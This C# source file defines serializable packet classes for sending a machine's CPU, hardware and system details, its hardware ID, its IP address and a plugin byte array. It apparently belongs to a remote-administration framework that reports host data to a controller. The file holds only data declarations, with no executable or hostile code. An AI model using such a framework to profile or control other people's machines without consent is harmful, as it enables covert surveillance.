using System;
using System.Collections.Generic;

/* 
|| AUTHOR Arsium ||
|| github : https://github.com/arsium       ||
*/

namespace PacketLib.Packet
{
    [Serializable]
    public class HardwareInformation
    {
        public Dictionary<string, List<string>> cpuInformation { get; set; }
        public Dictionary<string, string> hardwareInformation { get; set; }
    }

    [Serializable]
    public class SystemInformation 
    {
        public enum AccountType
        {
            Admin,
            User,
            Guest,
            Unknown
        }
        public Dictionary<string, string> systemInformation { get; set; }
    }

    [Serializable]
    public class Information
    {
        public HardwareInformation hardwareInformation;
        public SystemInformation systemInformation;
    }

    [Serializable]
    public class InformationPacket : IPacket
    {
        public InformationPacket() : base()
        {
            this.PacketType = PacketType.MISC_INFORMATION;
        }

        public InformationPacket(Dictionary<string, List<string>> cpuInformation, string baseIp, string HWID) : base()
        {
            this.PacketType = PacketType.MISC_INFORMATION;
            this.BaseIp = baseIp;
            this.HWID = HWID;
            this.information = new Information();
            this.information.hardwareInformation = new HardwareInformation();
            this.information.systemInformation = new SystemInformation();
            this.information.hardwareInformation.cpuInformation = cpuInformation;
        }

        public string HWID { get; set; }
        public string BaseIp { get; set; }
        public byte[] Plugin { get; set; }
        public PacketType PacketType { get; }
        public PacketState PacketState { get; set; }
        public string Status { get; set; }
        public string DatePacketStatus { get; set; }
        public int PacketSize { get; set; }

        public Information information { get; set; }
    }
}
